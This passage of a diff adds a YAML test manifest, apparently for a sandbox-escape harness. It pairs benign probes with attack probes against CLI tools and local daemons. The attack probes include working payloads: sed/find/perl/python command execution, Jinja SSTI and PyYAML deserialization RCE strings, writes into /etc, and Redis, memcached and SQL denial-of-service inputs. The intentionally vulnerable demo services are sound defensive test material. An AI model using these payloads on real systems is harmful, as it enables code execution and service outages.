+    stdin_text: 'foo_cosmos
+
+      '
+    expect_stdout_contains: bar_cosmos
+  attack_probes:
+  - name: gnu_sed_e_rce
+    threat_class: capability_execve
+    args:
+    - s/.*/id/e
+    stdin_text: 'trigger
+
+      '
+- id: find_cli
+  archetype: cli
+  cmd:
+  - find
+  benign_probes:
+  - name: list_workdir
+    args:
+    - '{WORKDIR}'
+    - -maxdepth
+    - '1'
+    files:
+      sample.txt: ok
+    expect_stdout_contains: sample.txt
+  attack_probes:
+  - name: find_exec_rce
+    threat_class: capability_execve
+    args:
+    - '{WORKDIR}'
+    - -maxdepth
+    - '1'
+    - -exec
+    - id
+    - ;
+    files:
+      sample.txt: ok
+- id: base64_cli
+  archetype: cli
+  cmd:
+  - base64
+  benign_probes:
+  - name: b64_decode
+    args:
+    - -d
+    stdin_text: 'Q09TTU9TX09L
+
+      '
+    expect_stdout_contains: COSMOS_OK
+  attack_probes:
+  - name: b64_invalid_dos
+    threat_class: algo_dos
+    args:
+    - -d
+    stdin_text: '!!!NOT_BASE64!!!'
+- id: bc_cli
+  archetype: cli
+  cmd:
+  - bc
+  benign_probes:
+  - name: bc_add
+    stdin_text: '40+2
+
+      '
+    expect_stdout_contains: '42'
+  attack_probes:
+  - name: bc_exp_bomb
+    threat_class: cpu_dos
+    stdin_text: '2^99999999
+
+      '
+- id: perl_cli
+  archetype: cli
+  cmd:
+  - perl
+  benign_probes:
+  - name: perl_sub
+    args:
+    - -pe
+    - s/a/b/g
+    stdin_text: 'aaa
+
+      '
+    expect_stdout_contains: bbb
+  attack_probes:
+  - name: perl_system_rce
+    threat_class: capability_execve
+    args:
+    - -e
+    - system('id')
+  - name: perl_socket_exfil
+    threat_class: mimicry_exfil
+    args:
+    - -MIO::Socket::INET
+    - -e
+    - IO::Socket::INET->new('127.0.0.1:9')
+- id: patch_cli
+  archetype: cli
+  cmd:
+  - patch
+  benign_probes:
+  - name: patch_local_file
+    args:
+    - -d
+    - '{WORKDIR}'
+    - -i
+    - '{WORKDIR}/ok.patch'
+    files:
+      target.txt: 'hello
+
+        '
+      ok.patch: '--- target.txt
+
+        +++ target.txt
+
+        @@ -1 +1 @@
+
+        -hello
+
+        +cosmos
+
+        '
+    expect_stdout_contains: patching file target.txt
+  attack_probes:
+  - name: patch_etc_escape
+    threat_class: fs_escape
+    args:
+    - -p0
+    - -i
+    - '{WORKDIR}/evil.patch'
+    files:
+      evil.patch: '--- /etc/hostname
+
+        +++ /etc/hostname
+
+        @@ -1 +1 @@
+
+        -x
+
+        +pwned
+
+        '
+  requires_priv_ops: true
+- id: diff_cli
+  archetype: cli
+  cmd:
+  - diff
+  benign_probes:
+  - name: diff_files
+    args:
+    - -u
+    - '{WORKDIR}/a.txt'
+    - '{WORKDIR}/b.txt'
+    files:
+      a.txt: '1
+
+        '
+      b.txt: '2
+
+        '
+    expect_stdout_contains: '@@'
+    expect_exit_codes:
+    - 0
+    - 1
+  attack_probes:
+  - name: diff_missing_escape
+    threat_class: fs_escape
+    args:
+    - '{WORKDIR}/a.txt'
+    - /nonexistent_secret
+    files:
+      a.txt: '1
+
+        '
+- id: sort_cli
+  archetype: cli
+  cmd:
+  - sort
+  benign_probes:
+  - name: sort_nums
+    args:
+    - -n
+    stdin_text: '3
+
+      1
+
+      2
+
+      '
+    expect_stdout_contains: '1'
+  attack_probes:
+  - name: sort_etc_write_escape
+    threat_class: fs_escape
+    args:
+    - -o
+    - /etc/pwned_sort
+    stdin_text: 'pwned
+
+      '
+- id: split_cli
+  archetype: cli
+  cmd:
+  - split
+  benign_probes:
+  - name: split_local
+    args:
+    - -l
+    - '1'
+    - '{WORKDIR}/in.txt'
+    - '{WORKDIR}/p_'
+    files:
+      in.txt: 'a
+
+        b
+
+        '
+  attack_probes:
+  - name: split_etc_escape
+    threat_class: fs_escape
+    args:
+    - -l
+    - '1'
+    - '{WORKDIR}/in.txt'
+    - /etc/pwned_
+    files:
+      in.txt: 'a
+
+        '
+- id: python3_cli
+  archetype: cli
+  cmd:
+  - python3
+  benign_probes:
+  - name: py_json_parse
+    args:
+    - -c
+    - import json,sys; print(json.loads(sys.stdin.read())['k'])
+    stdin_text: '{"k":"PY_OK"}'
+    expect_stdout_contains: PY_OK
+  attack_probes:
+  - name: py_exec_rce
+    threat_class: capability_execve
+    args:
+    - -c
+    - import os; os.system('id')
+  - name: py_c2_socket
+    threat_class: mimicry_exfil
+    args:
+    - -c
+    - import socket; socket.socket(2,1)
+- id: nginx_daemon
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - nginx
+  - -e
+  - '{WORKDIR}/boot.log'
+  - -p
+  - '{WORKDIR}'
+  - -c
+  - '{WORKDIR}/nginx.conf'
+  base_files:
+    html/index.html: COSMOS_NGINX_OK
+    nginx.conf: "daemon off;\nmaster_process off;\npid {WORKDIR}/nginx.pid;\nerror_log\
+      \ {WORKDIR}/error.log;\nevents { worker_connections 64; }\nhttp {\n    access_log\
+      \ off;\n    client_max_body_size 32m;\n    client_body_temp_path {WORKDIR}/tmp_body;\n\
+      \    proxy_temp_path {WORKDIR}/tmp_proxy;\n    fastcgi_temp_path {WORKDIR}/tmp_fcgi;\n\
+      \    uwsgi_temp_path {WORKDIR}/tmp_uwsgi;\n    scgi_temp_path {WORKDIR}/tmp_scgi;\n\
+      \    server {\n        listen 127.0.0.1:{PORT};\n        location / { root {WORKDIR}/html;\
+      \ index index.html; }\n    }\n}\n"
+  benign_probes:
+  - name: http_get_root
+    http_probes:
+    - method: GET
+      path: /
+    expect_http_status: 200
+    expect_http_contains: COSMOS_NGINX_OK
+  attack_probes:
+  - name: http_flood_60x
+    threat_class: cpu_dos
+    http_probes:
+    - method: POST
+      path: /
+      body_kb: 64
+      repeat: 60
+  requires_priv_ops: true
+- id: nginx_api_static
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - nginx
+  - -e
+  - '{WORKDIR}/boot.log'
+  - -p
+  - '{WORKDIR}'
+  - -c
+  - '{WORKDIR}/nginx.conf'
+  base_files:
+    html/api.json: '{"status":"healthy"}'
+    nginx.conf: "daemon off;\nmaster_process off;\npid {WORKDIR}/nginx.pid;\nerror_log\
+      \ {WORKDIR}/error.log;\nevents { worker_connections 64; }\nhttp {\n    access_log\
+      \ off;\n    client_max_body_size 32m;\n    client_body_temp_path {WORKDIR}/tmp_body;\n\
+      \    proxy_temp_path {WORKDIR}/tmp_proxy;\n    fastcgi_temp_path {WORKDIR}/tmp_fcgi;\n\
+      \    uwsgi_temp_path {WORKDIR}/tmp_uwsgi;\n    scgi_temp_path {WORKDIR}/tmp_scgi;\n\
+      \    server {\n        listen 127.0.0.1:{PORT};\n        location / { root {WORKDIR}/html;\
+      \ }\n    }\n}\n"
+  benign_probes:
+  - name: get_api_json
+    http_probes:
+    - method: GET
+      path: /api.json
+    expect_http_status: 200
+    expect_http_contains: healthy
+  attack_probes:
+  - name: http_flood_60x
+    threat_class: cpu_dos
+    http_probes:
+    - method: POST
+      path: /api.json
+      body_kb: 64
+      repeat: 60
+  requires_priv_ops: true
+- id: lighttpd_daemon
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - lighttpd
+  - -D
+  - -f
+  - '{WORKDIR}/lighttpd.conf'
+  base_files:
+    html/index.html: COSMOS_LIGHTTPD_OK
+    lighttpd.conf: 'server.document-root = "{WORKDIR}/html"
+
+      server.port = {PORT}
+
+      server.bind = "127.0.0.1"
+
+      server.errorlog = "{WORKDIR}/lighttpd_err.log"
+
+      index-file.names = ( "index.html" )
+
+      '
+  benign_probes:
+  - name: http_get_root
+    http_probes:
+    - method: GET
+      path: /
+    expect_http_status: 200
+    expect_http_contains: COSMOS_LIGHTTPD_OK
+  attack_probes:
+  - name: http_flood_60x
+    threat_class: cpu_dos
+    http_probes:
+    - method: POST
+      path: /
+      body_kb: 64
+      repeat: 60
+  requires_priv_ops: true
+- id: redis_daemon
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - redis-server
+  - --port
+  - '{PORT}'
+  - --bind
+  - 127.0.0.1
+  - --dir
+  - '{WORKDIR}'
+  - --save
+  - ''
+  - --appendonly
+  - 'no'
+  - --daemonize
+  - 'no'
+  - --protected-mode
+  - 'no'
+  benign_probes:
+  - name: redis_ping
+    tcp_probes:
+    - send: "*1\r\n$4\r\nPING\r\n"
+    expect_http_status: 200
+    expect_http_contains: PONG
+  attack_probes:
+  - name: redis_lua_cpu_dos
+    threat_class: cpu_dos
+    tcp_probes:
+    - send: "*3\r\n$4\r\nEVAL\r\n$17\r\nwhile true do end\r\n$1\r\n0\r\n"
+  requires_fork: true
+- id: memcached_daemon
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - memcached
+  - -l
+  - 127.0.0.1
+  - -p
+  - '{PORT}'
+  - -u
+  - root
+  - -c
+  - '64'
+  - -m
+  - '64'
+  - -I
+  - 32m
+  benign_probes:
+  - name: memcached_version
+    tcp_probes:
+    - send: "version\r\n"
+    expect_http_status: 200
+    expect_http_contains: VERSION
+  attack_probes:
+  - name: memcached_slab_bomb
+    threat_class: memory_dos
+    tcp_probes:
+    - send: "set k 0 0 20000000\r\n"
+    - send: A
+      send_repeat: 20000000
+- id: python_http_service
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - python3
+  - '{WORKDIR}/srv.py'
+  - '{PORT}'
+  base_files:
+    srv.py: "import os, sys\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\
+      class H(BaseHTTPRequestHandler):\n    def log_message(self, *a): pass\n    def\
+      \ do_GET(self):\n        if self.path == \"/health\":\n            self.send_response(200);\
+      \ self.end_headers(); self.wfile.write(b\"SVC_OK\")\n        elif self.path\
+      \ == \"/rce\":\n            os.system(\"id\"); self.send_response(200); self.end_headers()\n\
+      \        elif self.path == \"/fs_escape\":\n            open(\"/etc/pwned_http\"\
+      , \"w\").write(\"x\"); self.send_response(200); self.end_headers()\n       \
+      \ elif self.path == \"/mem_bomb\":\n            _ = bytearray(180 * 1024 * 1024);\
+      \ self.send_response(200); self.end_headers()\nHTTPServer((\"127.0.0.1\", int(sys.argv[1])),\
+      \ H).serve_forever()\n"
+  benign_probes:
+  - name: health_check
+    http_probes:
+    - method: GET
+      path: /health
+    expect_http_status: 200
+    expect_http_contains: SVC_OK
+  attack_probes:
+  - name: handler_rce
+    threat_class: capability_execve
+    http_probes:
+    - method: GET
+      path: /rce
+  - name: handler_fs_escape
+    threat_class: fs_escape
+    http_probes:
+    - method: GET
+      path: /fs_escape
+  - name: handler_mem_bomb
+    threat_class: memory_dos
+    http_probes:
+    - method: GET
+      path: /mem_bomb
+- id: python_ssrf_service
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - python3
+  - '{WORKDIR}/ssrf.py'
+  - '{PORT}'
+  base_files:
+    ssrf.py: "import os, socket, sys\nfrom http.server import BaseHTTPRequestHandler,\
+      \ HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def log_message(self, *a):\
+      \ pass\n    def do_GET(self):\n        if self.path == '/status':\n        \
+      \    self.send_response(200); self.end_headers(); self.wfile.write(b'SSRF_SVC_OK')\n\
+      \        elif self.path == '/ssrf_c2':\n            socket.socket(socket.AF_INET,\
+      \ socket.SOCK_STREAM).connect(('127.0.0.1', 9))\n            self.send_response(200);\
+      \ self.end_headers()\n        elif self.path == '/write_etc':\n            open('/etc/pwned_ssrf',\
+      \ 'w').write('x'); self.send_response(200); self.end_headers()\nHTTPServer(('127.0.0.1',\
+      \ int(sys.argv[1])), H).serve_forever()\n"
+  benign_probes:
+  - name: status_ok
+    http_probes:
+    - method: GET
+      path: /status
+    expect_http_status: 200
+    expect_http_contains: SSRF_SVC_OK
+  attack_probes:
+  - name: ssrf_outbound_connect
+    threat_class: mimicry_exfil
+    http_probes:
+    - method: GET
+      path: /ssrf_c2
+  - name: ssrf_fs_escape
+    threat_class: fs_escape
+    http_probes:
+    - method: GET
+      path: /write_etc
+- id: python_jinja_service
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - python3
+  - '{WORKDIR}/jinja_svc.py'
+  - '{PORT}'
+  base_files:
+    jinja_svc.py: "import sys, jinja2\nfrom http.server import BaseHTTPRequestHandler,\
+      \ HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def log_message(self, *a):\
+      \ pass\n    def do_POST(self):\n        n = int(self.headers.get(\"Content-Length\"\
+      , \"0\"))\n        tpl = self.rfile.read(n).decode(\"utf-8\")\n        out =\
+      \ jinja2.Template(tpl).render(name=\"COSMOS\")\n        self.send_response(200);\
+      \ self.end_headers(); self.wfile.write(out.encode(\"utf-8\"))\nHTTPServer((\"\
+      127.0.0.1\", int(sys.argv[1])), H).serve_forever()\n"
+  benign_probes:
+  - name: safe_render
+    http_probes:
+    - method: POST
+      path: /
+      body: Hello {{ name }}
+    expect_http_status: 200
+    expect_http_contains: Hello COSMOS
+  attack_probes:
+  - name: ssti_rce
+    threat_class: capability_execve
+    http_probes:
+    - method: POST
+      path: /
+      body: '{{ ''''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[''sys''].modules[''os''].system(''id'')
+        }}'
+- id: python_yaml_service
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - python3
+  - '{WORKDIR}/yaml_svc.py'
+  - '{PORT}'
+  base_files:
+    yaml_svc.py: "import sys, yaml\nfrom http.server import BaseHTTPRequestHandler,\
+      \ HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def log_message(self, *a):\
+      \ pass\n    def do_POST(self):\n        n = int(self.headers.get(\"Content-Length\"\
+      , \"0\"))\n        obj = yaml.load(self.rfile.read(n).decode(\"utf-8\"), Loader=yaml.Loader)\n\
+      \        self.send_response(200); self.end_headers(); self.wfile.write(str(obj).encode(\"\
+      utf-8\"))\nHTTPServer((\"127.0.0.1\", int(sys.argv[1])), H).serve_forever()\n"
+  benign_probes:
+  - name: safe_yaml_post
+    http_probes:
+    - method: POST
+      path: /
+      body: 'mode: prod
+
+        '
+    expect_http_status: 200
+    expect_http_contains: prod
+  attack_probes:
+  - name: yaml_http_rce
+    threat_class: capability_execve
+    http_probes:
+    - method: POST
+      path: /
+      body: '!!python/object/apply:os.system [''id'']
+
+        '
+- id: python_sql_service
+  archetype: daemon
+  requires_network: true
+  cmd:
+  - python3
+  - '{WORKDIR}/sql_svc.py'
+  - '{PORT}'
+  base_files:
+    sql_svc.py: "import sqlite3, sys\nfrom http.server import BaseHTTPRequestHandler,\
+      \ HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def log_message(self, *a):\
+      \ pass\n    def do_POST(self):\n        n = int(self.headers.get(\"Content-Length\"\
+      , \"0\"))\n        q = self.rfile.read(n).decode(\"utf-8\")\n        res = sqlite3.connect(\"\
+      :memory:\").execute(q).fetchall()\n        self.send_response(200); self.end_headers();\
+      \ self.wfile.write(str(res).encode(\"utf-8\"))\nHTTPServer((\"127.0.0.1\", int(sys.argv[1])),\
+      \ H).serve_forever()\n"
+  benign_probes:
+  - name: benign_sql_post
+    http_probes:
+    - method: POST
+      path: /
+      body: SELECT 40+2
+    expect_http_status: 200
+    expect_http_contains: '42'
+  attack_probes:
+  - name: cte_http_dos
+    threat_class: cpu_dos
+    http_probes:
+    - method: POST
+      path: /
+      body: WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c LIMIT 50000000)
+        SELECT count(*) FROM c
